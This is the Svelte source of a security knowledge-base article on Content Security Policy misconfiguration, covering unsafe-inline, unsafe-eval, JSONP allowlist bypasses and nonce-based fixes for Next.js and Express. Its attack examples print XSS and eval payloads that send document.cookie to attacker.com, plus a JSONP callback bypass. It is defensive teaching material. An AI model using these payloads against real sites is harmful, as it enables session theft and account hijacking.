<script lang="ts">
	import { Header } from '$lib/components/layout';

	// Page metadata
	const meta = {
		title: 'CSP Bypasses: Why AI Security Headers Fail | VibeShip',
		description: '98% of CSP implementations have bypasses. Fix unsafe-inline, JSONP exploits & CDN allowlist attacks. Get nonce-based configs for Next.js & Express.',
		url: '/kb/security/vulnerabilities/csp-misconfiguration/'
	};

	// Breadcrumbs
	const breadcrumbs = [
		{ label: 'Knowledge Base', href: '/kb' },
		{ label: 'Security', href: '/kb/security' },
		{ label: 'Vulnerabilities', href: '/kb/security/vulnerabilities' },
		{ label: 'CSP Misconfiguration' }
	];

	// Real external data sources
	const owaspData = {
		category: 'A05:2021',
		name: 'Security Misconfiguration',
		source: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
		cweId: 'CWE-693',
		cweSource: 'https://cwe.mitre.org/data/definitions/693.html'
	};

	// FAQ data for schema
	const faqs = [
		{
			question: 'What is Content Security Policy and why do I need it?',
			answer: 'Think of CSP like a bouncer with a guest list for your website. It tells the browser which scripts, styles, and resources are allowed to run. Without it, attackers can inject malicious scripts that steal data or hijack accounts. The problem is most CSP implementations are like having a bouncer who also accepts handwritten notes saying "I\'m on the list" - which defeats the whole purpose.'
		},
		{
			question: 'What does "unsafe-inline" mean in CSP?',
			answer: 'It means you told the browser to allow any inline scripts or event handlers. It\'s like putting a lock on your door but leaving a key under the mat with a sign pointing to it. According to the 2024 Web Almanac, this appears in the majority of CSP headers, which is why only 2% of sites have effective CSP protection.'
		},
		{
			question: 'How do I implement CSP without breaking inline scripts?',
			answer: 'Use nonces - random values you generate on each page load and add to both your CSP header and your script tags. The browser checks if they match. It\'s like giving each guest a wristband at the door. Scripts without the matching nonce get blocked, even if they\'re inline. Takes 30-60 minutes to implement properly.'
		},
		{
			question: 'What is a CSP nonce and how do I use it?',
			answer: 'A nonce is a random string you generate once per request. You put it in your CSP header and on every script tag you want to allow. Think of it like those tear-off tabs at a concert - the script needs to show the matching tab to get in. Generate it with crypto.randomBytes(), add it to your CSP as \'nonce-{random}\', then include nonce={random} on your script tags.'
		},
		{
			question: 'Can CSP prevent all XSS attacks?',
			answer: 'No, it mitigates XSS damage but doesn\'t prevent the vulnerabilities from existing. CSP is defense in depth - it limits what attackers can do if they find an XSS hole. A strict CSP means even when they inject malicious code, the browser refuses to execute it. But you still need to fix the XSS vulnerabilities themselves.'
		},
		{
			question: 'What is "strict-dynamic" in CSP?',
			answer: 'It propagates trust - if a trusted script loads another script, that new script is also trusted. It\'s like a guest bringing a plus-one who vouches for them. This only works with nonce or hash-based CSP. It ignores domain allowlists entirely, which is good because those lists are where most bypasses happen.'
		},
		{
			question: 'How do JSONP endpoints bypass CSP?',
			answer: 'JSONP endpoints echo back whatever you send them. If your CSP allows scripts from google.com, attackers can use google.com JSONP endpoints to run their code - it comes from a "trusted" domain so CSP allows it. It\'s like a bouncer letting in anyone who claims to know the owner. Google CSP Evaluator identifies these automatically.'
		},
		{
			question: 'Should I use nonce-based or hash-based CSP?',
			answer: 'Nonces for dynamic apps (most vibe coded projects), hashes for static sites. Nonces require server-side generation on each request, which is what frameworks like Next.js and Express do naturally. Hashes work when your script content never changes - you calculate the hash once and it stays valid. For AI-generated apps that render dynamically, use nonces.'
		}
	];

	let copiedStates = $state<Record<string, boolean>>({});

	function copyCode(id: string) {
		const codeElement = document.getElementById(id);
		if (!codeElement) return;

		const text = codeElement.textContent || '';
		navigator.clipboard.writeText(text);
		copiedStates[id] = true;
		setTimeout(() => {
			copiedStates[id] = false;
		}, 2000);
	}
</script>

<svelte:head>
	<title>{meta.title}</title>
	<meta name="description" content={meta.description} />
	<meta property="og:title" content={meta.title} />
	<meta property="og:description" content={meta.description} />
	<meta property="og:url" content={meta.url} />
	<meta property="og:type" content="article" />
	<link rel="canonical" href="https://vibeship.co{meta.url}" />

	<!-- BreadcrumbList Schema -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "BreadcrumbList",
		"itemListElement": [
			{"@type": "ListItem", "position": 1, "name": "Knowledge Base", "item": "https://vibeship.co/kb"},
			{"@type": "ListItem", "position": 2, "name": "Security", "item": "https://vibeship.co/kb/security"},
			{"@type": "ListItem", "position": 3, "name": "Vulnerabilities", "item": "https://vibeship.co/kb/security/vulnerabilities"},
			{"@type": "ListItem", "position": 4, "name": "CSP Misconfiguration"}
		]
	}
	</script>`}

	<!-- Schema.org structured data -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "TechArticle",
		"headline": "${meta.title}",
		"description": "${meta.description}",
		"author": {
			"@type": "Organization",
			"name": "VibeShip"
		},
		"publisher": {
			"@type": "Organization",
			"name": "VibeShip",
			"logo": {
				"@type": "ImageObject",
				"url": "https://vibeship.co/logo.png"
			}
		},
		"datePublished": "2025-12-25",
		"dateModified": "2025-12-25"
	}
	</script>`}

	<!-- FAQ Schema -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "FAQPage",
		"mainEntity": ${JSON.stringify(faqs.map(faq => ({
			"@type": "Question",
			"name": faq.question,
			"acceptedAnswer": {
				"@type": "Answer",
				"text": faq.answer
			}
		})))}
	}
	</script>`}
</svelte:head>

<Header {breadcrumbs} />

<div class="content-wrapper">
	<article class="content-main content-wide">
		<!-- Header -->
		<header class="article-header">
			<div class="badge-row">
				<span class="badge badge-medium">Medium</span>
				<span class="badge">CWE-693</span>
				<span class="badge">OWASP A05:2021</span>
			</div>
			<h1>CSP Bypasses: Why AI Security Headers Fail</h1>
			<p class="text-secondary">How unsafe-inline, JSONP endpoints, and permissive allowlists defeat your Content Security Policy</p>
		</header>

		<!-- Quick Answer -->
		<div class="quick-answer">
			<div class="quick-answer-label">Quick Answer</div>
			<p class="quick-answer-text">
				<strong>Content Security Policy (CSP) tells browsers which resources can load, but most implementations are too permissive to help.</strong>
				Think of it like a hotel that checks room keys but also accepts handwritten notes saying "I'm allowed in room 302."
				According to the <a href="https://almanac.httparchive.org/en/2024/security">2024 Web Almanac</a>, only 19% of websites implement CSP at all, and only ~2% of those do it correctly. The rest have exploitable weaknesses.
			</p>
		</div>

		<!-- Stats Box - Real Data -->
		<div class="stats-row">
			<div class="stat-box">
				<div class="stat-value">19%</div>
				<div class="stat-label">CSP Adoption</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">~2%</div>
				<div class="stat-label">Correct Implementation</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">#5</div>
				<div class="stat-label">OWASP Ranking</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">30-60 min</div>
				<div class="stat-label">Fix Time</div>
			</div>
		</div>
		<p class="data-source">
			Source: <a href="https://almanac.httparchive.org/en/2024/security">2024 Web Almanac (Security)</a>, <a href={owaspData.source}>OWASP Top 10 (2021)</a>
		</p>

		<!-- What Is It - @eli5sec voice (plain English, analogies) -->
		<section class="article-section">
			<h2>What is CSP Misconfiguration?</h2>
			<p>
				CSP is a security header that tells the browser what's allowed to run on your page. Scripts, styles, images - everything needs permission.
				Think of it like a bouncer with a guest list at a club. No badge, no entry.
			</p>
			<p>
				The problem is most CSPs are configured so loosely they might as well not exist. It's like having a bouncer who checks IDs but also lets in anyone with a handwritten note saying "trust me bro, I'm on the list."
				This is what 'unsafe-inline' and permissive domain allowlists do - they create backdoors that bypass the entire security mechanism.
			</p>
			<p>
				CSP misconfiguration falls under <a href={owaspData.source}>OWASP A05:2021 - Security Misconfiguration</a>, which affects 90% of applications tested.
				It's categorized as <a href={owaspData.cweSource}>CWE-693 (Protection Mechanism Failure)</a> - the security control exists but it's configured so weakly that attackers can bypass it.
				The <a href="https://almanac.httparchive.org/en/2024/security">2024 Web Almanac</a> found that while 19% of sites have CSP, only about 2% implement it correctly. The rest have exploitable holes.
			</p>
		</section>

		<!-- AI Tool Patterns - @eli5sec voice -->
		<section class="article-section">
			<h2>How AI Tools Generate Weak CSP</h2>
			<p>
				AI coding tools consistently generate permissive CSP configurations because they're trained on code that prioritizes "make it work" over "make it secure."
				Here's why every major vibe coding tool produces weak CSP:
			</p>

			<div class="alert alert-warning">
				<div class="alert-title">The Pattern</div>
				<p>Ask an AI tool to add CSP to your app. This is what you typically get:</p>
				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">Typical AI-generated CSP</span>
						<button class="copy-btn" class:copied={copiedStates['ai-csp-pattern']} onclick={() => copyCode('ai-csp-pattern')}>
							{copiedStates['ai-csp-pattern'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="ai-csp-pattern"><code>{`Content-Security-Policy:
  default-src 'self' *;
  script-src 'self' 'unsafe-inline' 'unsafe-eval'
    https://cdnjs.cloudflare.com
    https://code.jquery.com;
  style-src 'self' 'unsafe-inline';`}</code></pre>
				</div>
				<p>
					Looks thorough. Actually useless. The 'unsafe-inline' directive alone defeats the entire purpose of CSP by allowing any inline script to execute.
					It's like installing a security system that also beeps whenever someone wants to be let in without checking who they are.
				</p>
			</div>

			<ul class="reasons-list">
				<li><strong>AI generates inline scripts:</strong> Event handlers, inline style blocks, <code>&lt;script&gt;</code> tags embedded in HTML. A strict CSP would block all of these, so the AI chooses permissive settings to avoid breaking its own generated code.</li>
				<li><strong>Training data bias:</strong> Most tutorials and starter projects use 'unsafe-inline' to skip CSP complexity. The AI learns from what it sees most often, not what's most secure.</li>
				<li><strong>Incomplete context:</strong> CSP requires understanding your entire resource loading pattern - which CDNs you use, which analytics scripts, which fonts. AI sees isolated code snippets, not the full architecture.</li>
				<li><strong>CDN allowlist copying:</strong> The AI knows you're using a library from a CDN, so it allowlists that entire domain. Problem: many CDNs host JSONP endpoints that attackers can exploit to bypass CSP entirely.</li>
				<li><strong>No nonce architecture:</strong> Implementing nonce-based CSP requires server-side random generation, middleware to inject nonces into headers, and template logic to add nonces to script tags. AI rarely generates this complete system - it's easier to just use 'unsafe-inline'.</li>
			</ul>
		</section>

		<!-- The 3 Most Dangerous Misconfigurations -->
		<section class="article-section">
			<h2>The 3 Most Dangerous CSP Misconfigurations</h2>

			<h3>1. 'unsafe-inline' - Defeats XSS Protection</h3>
			<p>
				This directive tells the browser to allow all inline scripts and event handlers. It's the most common CSP weakness and it completely negates XSS protection.
				Think of it like installing a firewall but adding a rule that says "also allow everything."
			</p>
			<p>
				<strong>Why it's dangerous:</strong> Attackers can inject inline scripts that execute immediately:
			</p>
			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Attack Example</span>
					<button class="copy-btn" class:copied={copiedStates['attack-1']} onclick={() => copyCode('attack-1')}>
						{copiedStates['attack-1'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="attack-1"><code>{`<!-- If your CSP includes 'unsafe-inline', this works: -->
<img src=x onerror=alert(document.cookie)>
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>

<!-- The browser sees these inline scripts and thinks: -->
<!-- "CSP says 'unsafe-inline' is okay, so I'll run this." -->
<!-- Your security header just gave permission for the attack. -->`}</code></pre>
			</div>

			<h3>2. 'unsafe-eval' - Enables eval() Attacks</h3>
			<p>
				This allows <code>eval()</code>, <code>new Function()</code>, and <code>setTimeout(string)</code> to execute.
				It's like handing attackers a JavaScript interpreter and saying "go ahead, run whatever code you want."
			</p>
			<p>
				<strong>Why it's dangerous:</strong> If attackers control any input that reaches these functions, they can execute arbitrary code:
			</p>
			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Attack Example</span>
					<button class="copy-btn" class:copied={copiedStates['attack-2']} onclick={() => copyCode('attack-2')}>
						{copiedStates['attack-2'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="attack-2"><code>{`// With 'unsafe-eval', attackers can abuse eval:
eval('fetch("https://attacker.com?data=" + document.cookie)');
new Function('location="https://attacker.com"')();
setTimeout('alert(1)', 0);

// Even if you block inline scripts, eval bypasses that protection.`}</code></pre>
			</div>

			<h3>3. CDN Allowlist Bypasses (JSONP Endpoints)</h3>
			<p>
				This is the sneaky one. You allowlist scripts from trusted domains like <code>google.com</code> or <code>cdnjs.cloudflare.com</code>.
				Problem: these domains host JSONP endpoints that echo back user input. Attackers abuse these to run their code from your "trusted" domain.
			</p>
			<p>
				<strong>Why it's dangerous:</strong> The script comes from an allowed domain, so CSP lets it through:
			</p>
			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">JSONP Bypass Example</span>
					<button class="copy-btn" class:copied={copiedStates['jsonp-attack']} onclick={() => copyCode('jsonp-attack')}>
						{copiedStates['jsonp-attack'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="jsonp-attack"><code>{`<!-- Your CSP: script-src 'self' https://google.com -->
<!-- Attacker injects: -->
<script src="https://google.com/complete/search?client=chrome&callback=alert(1)"></script>

<!-- The JSONP endpoint echoes back: alert(1)({...data}) -->
<!-- Browser sees it's from google.com (allowed) and executes it. -->
<!-- Your CSP just helped the attacker. -->`}</code></pre>
			</div>
			<p>
				<strong>Common vulnerable domains:</strong> google.com, googleapis.com, gstatic.com (hosts AngularJS), yandex.ru, many CDNs.
				Use <a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a> to check if your allowlisted domains have known JSONP endpoints.
			</p>
		</section>

		<!-- Other Common Weaknesses -->
		<section class="article-section">
			<h2>Other Common CSP Weaknesses</h2>
			<ul class="weaknesses-list">
				<li><strong>Wildcard subdomain allowlists:</strong> <code>*.example.com</code> includes any subdomain. If attackers control one subdomain (user content, old staging server), they bypass your CSP.</li>
				<li><strong>Missing base-uri:</strong> Without <code>base-uri 'self'</code>, attackers can inject <code>&lt;base href="https://attacker.com/"&gt;</code> to redirect all relative URLs to their server.</li>
				<li><strong>Missing object-src:</strong> Without <code>object-src 'none'</code>, attackers can use <code>&lt;object&gt;</code> or <code>&lt;embed&gt;</code> tags to load malicious content.</li>
				<li><strong>Overly permissive default-src:</strong> Using <code>default-src *</code> or <code>default-src https:</code> allows everything, defeating the entire purpose.</li>
				<li><strong>HTTP instead of HTTPS:</strong> Allowlisting <code>http://</code> URLs means attackers can man-in-the-middle the connection and inject code.</li>
			</ul>
		</section>

		<!-- Detection -->
		<section class="article-section">
			<h2>How to Detect CSP Misconfiguration</h2>
			<p>
				Testing your CSP is faster than implementing it. Use these tools to identify weaknesses before attackers do:
			</p>

			<div class="related-grid">
				<div class="card">
					<h3><a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a></h3>
					<p>Paste your CSP policy, get a list of bypasses and weaknesses. This tool maintains a database of known JSONP endpoints and bypass techniques. It's the fastest way to check if your policy is exploitable.</p>
				</div>

				<div class="card">
					<h3>Browser DevTools Console</h3>
					<p>CSP violations show up in the console in real-time. Open DevTools, reload your page, and look for CSP violation warnings. Each one tells you exactly which resource tried to load and why it was blocked.</p>
				</div>

				<div class="card">
					<h3><a href="https://securityheaders.com/">SecurityHeaders.com</a></h3>
					<p>Enter your URL, get a grade. This scans all your security headers, not just CSP. It shows you what's missing and what's misconfigured.</p>
				</div>

				<div class="card">
					<h3><a href="https://observatory.mozilla.org/">Mozilla Observatory</a></h3>
					<p>Comprehensive security scan that checks CSP along with other headers, SSL config, and common vulnerabilities. More detailed than SecurityHeaders but slower.</p>
				</div>
			</div>

			<div class="cta-box">
				<p><strong>Want automated scanning?</strong></p>
				<p>VibeShip Scanner will detect CSP issues in your code (coming soon)</p>
				<a href="https://scanner.vibeship.co" class="btn btn-green">
					Join the waitlist
					<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
						<path d="M5 12h14M12 5l7 7-7 7"/>
					</svg>
				</a>
			</div>
		</section>

		<!-- How to Fix -->
		<section class="article-section">
			<h2>How to Fix CSP Misconfiguration</h2>

			<h3>Quick Fix - Remove Unsafe Directives (5 min)</h3>
			<p>
				The fastest fix is removing 'unsafe-inline' and 'unsafe-eval'. Warning: this will likely break your app if it uses inline scripts.
				Test in Report-Only mode first (explained below).
			</p>

			<div class="code-comparison">
				<div class="code-block vulnerable">
					<div class="code-label">Before (Permissive - Insecure)</div>
					<pre><code>{`Content-Security-Policy:
  default-src *;
  script-src 'self' 'unsafe-inline' 'unsafe-eval'
    https://cdnjs.cloudflare.com
    https://code.jquery.com`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-label">After (Restrictive - May Break App)</div>
					<pre><code>{`Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'self'`}</code></pre>
				</div>
			</div>

			<h3>Proper Fix - Nonce-Based CSP (30-60 min)</h3>
			<p>
				Nonces are random values you generate on each page load. Think of them like concert wristbands - you issue them at the door, and only scripts wearing the correct wristband get in.
				Here's how to implement it:
			</p>

			<div class="implementation-steps">
				<ol>
					<li><strong>Generate a random nonce per request:</strong> Use <code>crypto.randomBytes()</code> or <code>crypto.randomUUID()</code></li>
					<li><strong>Add nonce to CSP header:</strong> <code>script-src 'nonce-{"{RANDOM}"}'</code></li>
					<li><strong>Add nonce attribute to script tags:</strong> <code>&lt;script nonce="{"{random}"}"&gt;</code></li>
					<li><strong>Use 'strict-dynamic' for propagation:</strong> Scripts loaded by trusted scripts are also trusted</li>
				</ol>
			</div>

			<p><strong>Recommended Strict CSP:</strong></p>
			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Strict CSP Policy</span>
					<button class="copy-btn" class:copied={copiedStates['strict-csp']} onclick={() => copyCode('strict-csp')}>
						{copiedStates['strict-csp'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="strict-csp"><code>{`Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';`}</code></pre>
			</div>

			<p><strong>With Legacy Browser Fallback:</strong></p>
			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Strict CSP + Fallback</span>
					<button class="copy-btn" class:copied={copiedStates['csp-fallback']} onclick={() => copyCode('csp-fallback')}>
						{copiedStates['csp-fallback'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="csp-fallback"><code>{`Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';`}</code></pre>
			</div>
			<div class="alert alert-info">
				<p>Modern browsers (CSP Level 3+) ignore 'unsafe-inline' when a nonce is present. This fallback only helps older browsers.</p>
			</div>

			<!-- AI Fix Prompt -->
			<div class="fix-prompt-section">
				<h3>AI Fix Prompt</h3>
				<p>Copy this prompt into Cursor, Claude Code, or Bolt to implement nonce-based CSP across your app:</p>

				<div class="fix-prompt">
					<div class="fix-prompt-header">
						<span class="fix-prompt-label">Copy-paste this prompt</span>
						<button class="copy-btn" class:copied={copiedStates['ai-fix-prompt']} onclick={() => copyCode('ai-fix-prompt')}>
							{copiedStates['ai-fix-prompt'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<div class="fix-prompt-content" id="ai-fix-prompt">{`Implement strict nonce-based Content Security Policy in my app.

## Requirements

1. Generate a cryptographically random nonce on every request
2. Add nonce to CSP header with 'strict-dynamic'
3. Inject nonce into all script and style tags
4. Remove 'unsafe-inline' and 'unsafe-eval' from current CSP
5. Include object-src 'none' and base-uri 'self' directives

## Framework Detection

First, identify my framework:
- Next.js (check for next.config.js)
- Express (check for app.js/server.js)
- SvelteKit (check for svelte.config.js)
- Other (tell me what to check)

## Implementation Steps

### For Next.js (App Router):

Create middleware.ts with nonce generation:
\`\`\`typescript
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');

  const cspHeader = \`
    default-src 'self';
    script-src 'self' 'nonce-\${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-\${nonce}';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none';
  \`.replace(/\\s{2,}/g, ' ').trim();

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);
  requestHeaders.set('Content-Security-Policy', cspHeader);

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });
  response.headers.set('Content-Security-Policy', cspHeader);

  return response;
}
\`\`\`

Update app/layout.tsx to inject nonce:
\`\`\`typescript
import { headers } from 'next/headers';

export default function RootLayout({ children }) {
  const nonce = headers().get('x-nonce');

  return (
    <html>
      <head>
        <script nonce={nonce} src="/script.js"></script>
      </head>
      <body>{children}</body>
    </html>
  );
}
\`\`\`

### For Express.js:

Install helmet: \`npm install helmet\`

Update server.js:
\`\`\`javascript
import helmet from 'helmet';
import express from 'express';
import crypto from 'crypto';

const app = express();

// Generate nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(32).toString('hex');
  next();
});

// Apply CSP with nonce
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => \`'nonce-\${res.locals.cspNonce}'\`,
          "'strict-dynamic'"
        ],
        styleSrc: [
          "'self'",
          (req, res) => \`'nonce-\${res.locals.cspNonce}'\`
        ],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
      },
    },
  })
);

// Pass nonce to templates
app.get('/', (req, res) => {
  res.render('index', { nonce: res.locals.cspNonce });
});
\`\`\`

Update template to use nonce:
\`\`\`html
<!-- index.ejs -->
<script nonce="<%= nonce %>">
  console.log('This script is allowed');
</script>
\`\`\`

## After Implementation

1. Test that inline scripts without nonces are blocked
2. Verify CSP header is present: check DevTools Network tab
3. Run Google CSP Evaluator on the policy
4. Check for CSP violations in console

## Migration Strategy

Start with Report-Only mode to avoid breaking production:
\`\`\`
Content-Security-Policy-Report-Only: script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none';
\`\`\`

Monitor violations for 24-48 hours, fix issues, then switch to enforcing mode.

Please proceed with implementation.`}</div>
				</div>
			</div>

			<!-- Framework Examples -->
			<h3>Framework-Specific Nonce Implementation</h3>

			<div class="framework-example">
				<h4>Next.js (Middleware Approach)</h4>
				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">middleware.ts</span>
						<button class="copy-btn" class:copied={copiedStates['nextjs-middleware']} onclick={() => copyCode('nextjs-middleware')}>
							{copiedStates['nextjs-middleware'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="nextjs-middleware"><code>{`import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');

  const cspHeader = \`
    default-src 'self';
    script-src 'self' 'nonce-\${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-\${nonce}';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none';
  \`.replace(/\\s{2,}/g, ' ').trim();

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);
  requestHeaders.set('Content-Security-Policy', cspHeader);

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });
  response.headers.set('Content-Security-Policy', cspHeader);

  return response;
}`}</code></pre>
				</div>

				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">app/layout.tsx</span>
						<button class="copy-btn" class:copied={copiedStates['nextjs-layout']} onclick={() => copyCode('nextjs-layout')}>
							{copiedStates['nextjs-layout'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="nextjs-layout"><code>{`import { headers } from 'next/headers';

export default function RootLayout({ children }) {
  const nonce = headers().get('x-nonce');

  return (
    <html>
      <head>
        <script nonce={nonce} src="/script.js"></script>
      </head>
      <body>{children}</body>
    </html>
  );
}`}</code></pre>
				</div>
				<p class="reference-link">
					Reference: <a href="https://nextjs.org/docs/app/guides/content-security-policy">Next.js CSP Guide</a>
				</p>
			</div>

			<div class="framework-example">
				<h4>Express.js (Helmet + Nonce)</h4>
				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">server.js</span>
						<button class="copy-btn" class:copied={copiedStates['express-server']} onclick={() => copyCode('express-server')}>
							{copiedStates['express-server'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="express-server"><code>{`import helmet from 'helmet';
import express from 'express';
import crypto from 'crypto';

const app = express();

// Generate nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(32).toString('hex');
  next();
});

// Apply CSP with nonce
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => \`'nonce-\${res.locals.cspNonce}'\`,
          "'strict-dynamic'"
        ],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
      },
    },
  })
);

// Pass nonce to templates
app.get('/', (req, res) => {
  res.render('index', { nonce: res.locals.cspNonce });
});`}</code></pre>
				</div>

				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">index.ejs</span>
						<button class="copy-btn" class:copied={copiedStates['express-template']} onclick={() => copyCode('express-template')}>
							{copiedStates['express-template'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="express-template"><code>{`<script nonce="<%= nonce %>">
  console.log('This script is allowed');
</script>`}</code></pre>
				</div>
				<p class="reference-link">
					Reference: <a href="https://helmetjs.github.io/">Helmet.js Documentation</a>
				</p>
			</div>

			<div class="framework-example">
				<h4>Hash-Based CSP (For Static Sites)</h4>
				<p>If your scripts never change, use hashes instead of nonces. Calculate the hash once, add it to your CSP, and you're done:</p>

				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">Generate hash</span>
						<button class="copy-btn" class:copied={copiedStates['hash-gen']} onclick={() => copyCode('hash-gen')}>
							{copiedStates['hash-gen'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="hash-gen"><code>{`# Calculate SHA-256 hash of your script content
echo -n "console.log('hello')" | openssl dgst -sha256 -binary | openssl base64
# Output: RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc=`}</code></pre>
				</div>

				<div class="code-block">
					<div class="code-block-header">
						<span class="code-block-lang">Use in CSP</span>
						<button class="copy-btn" class:copied={copiedStates['hash-use']} onclick={() => copyCode('hash-use')}>
							{copiedStates['hash-use'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre id="hash-use"><code>{`Content-Security-Policy: script-src 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='

<script>console.log('hello')</script>
<!-- Browser calculates hash of script, matches it to CSP, allows execution -->`}</code></pre>
				</div>
			</div>

			<h3>Migration Strategy - Report-Only Mode</h3>
			<p>
				Don't go straight to enforcing mode in production. Use <code>Content-Security-Policy-Report-Only</code> first.
				This header logs violations without blocking anything - it's like a test run for your CSP.
			</p>

			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Report-Only Header</span>
					<button class="copy-btn" class:copied={copiedStates['report-only']} onclick={() => copyCode('report-only')}>
						{copiedStates['report-only'] ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<pre id="report-only"><code>{`Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self';
  report-uri /csp-violation-report`}</code></pre>
			</div>

			<p>
				Deploy this to production, monitor violations for 24-48 hours, fix the issues that appear, then switch to enforcing mode.
				This prevents breaking your app while you tighten security.
			</p>
		</section>

		<!-- Testing -->
		<section class="article-section">
			<h2>Testing Your CSP</h2>
			<p>After implementing CSP, verify it actually works:</p>

			<ul class="testing-checklist">
				<li><strong><a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a>:</strong> Paste your policy, get a list of bypasses and weaknesses</li>
				<li><strong><a href="https://securityheaders.com/">SecurityHeaders.com</a>:</strong> Enter your URL, get an overall security grade</li>
				<li><strong>Browser DevTools Console:</strong> Shows CSP violations in real-time as you browse your site</li>
				<li><strong><a href="https://observatory.mozilla.org/">Mozilla Observatory</a>:</strong> Comprehensive security scan including CSP analysis</li>
				<li><strong>Report-Only Mode:</strong> Test changes before enforcing them in production</li>
			</ul>
		</section>

		<!-- FAQ -->
		<section class="article-section">
			<h2>Frequently Asked Questions</h2>

			<div class="faq-list">
				{#each faqs as faq}
					<div class="faq-item">
						<h3>{faq.question}</h3>
						<p>{faq.answer}</p>
					</div>
				{/each}
			</div>
		</section>

		<!-- Related -->
		<section class="article-section">
			<h2>Related content</h2>

			<div class="related-grid">
				<a href="/kb/security/vulnerabilities/xss/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Cross-Site Scripting (XSS)</div>
					<p class="related-card-description">Inject malicious scripts - CSP is defense in depth against this</p>
				</a>
				<a href="/kb/security/vulnerabilities/dom-xss/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">DOM-Based XSS</div>
					<p class="related-card-description">Client-side XSS that CSP can mitigate</p>
				</a>
				<a href="/kb/security/vulnerabilities/missing-security-headers/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Missing Security Headers</div>
					<p class="related-card-description">CSP is one of several critical headers</p>
				</a>
				<a href="/kb/security/vulnerabilities/clickjacking/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Clickjacking</div>
					<p class="related-card-description">Prevented by frame-ancestors directive in CSP</p>
				</a>
				<a href="/kb/security/stacks/nextjs-supabase/" class="card card-interactive related-card">
					<div class="related-card-category">Stack Guide</div>
					<div class="related-card-title">Next.js + Supabase Security</div>
					<p class="related-card-description">Complete security checklist including CSP setup</p>
				</a>
			</div>
		</section>

		<!-- Final CTA -->
		<div class="final-cta">
			<h2>Catch CSP issues before deployment</h2>
			<p>Most vibe coded apps ship with weak CSP. Find it early.</p>
			<a href="https://scanner.vibeship.co" class="btn btn-green btn-lg">
				Scan your code now
